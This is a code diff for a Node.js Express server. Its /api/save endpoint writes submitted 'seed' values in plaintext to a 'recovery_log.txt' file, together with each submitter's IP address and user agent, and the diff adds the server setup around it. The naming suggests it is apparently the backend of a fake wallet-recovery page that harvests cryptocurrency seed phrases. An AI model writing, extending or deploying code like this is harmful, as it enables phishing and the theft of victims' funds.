@@ -1,3 +1,23 @@
+const express = require('express');
+const cors = require('cors');
+const fs = require('fs');
+const path = require('path');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+const LOG_PATH = process.env.RAILWAY_VOLUME_MOUNT_PATH
+  ? path.join(process.env.RAILWAY_VOLUME_MOUNT_PATH, 'recovery_log.txt')
+  : path.join(__dirname, 'recovery_log.txt');
+
+app.use(cors());
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
 app.post('/api/save', (req, res) => {
   const { seed } = req.body;
 
@@ -11,15 +31,6 @@ app.post('/api/save', (req, res) => {
 
   const logEntry = `[${timestamp}] Seed: "${seed}" | IP: ${ip} | User-Agent: ${userAgent}\n`;
 
-  // Determine storage directory (Railway volume or local /data/ directory)
-  const LOG_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH || path.join(__dirname, 'data');
-  const LOG_PATH = path.join(LOG_DIR, 'recovery_log.txt');
-
-  // Create directory if it doesn't exist
-  if (!fs.existsSync(LOG_DIR)) {
-    fs.mkdirSync(LOG_DIR, { recursive: true });
-  }
-
   fs.appendFile(LOG_PATH, logEntry, (err) => {
     if (err) {
       console.error('Failed to write log:', err);
@@ -28,4 +39,8 @@ app.post('/api/save', (req, res) => {
     console.log(`Logged submission from ${ip}`);
     res.json({ success: true, message: 'Seed logged successfully.' });
   });
+});
+
+app.listen(PORT, () => {
+  console.log(`Server running on http://localhost:${PORT}`);
 });
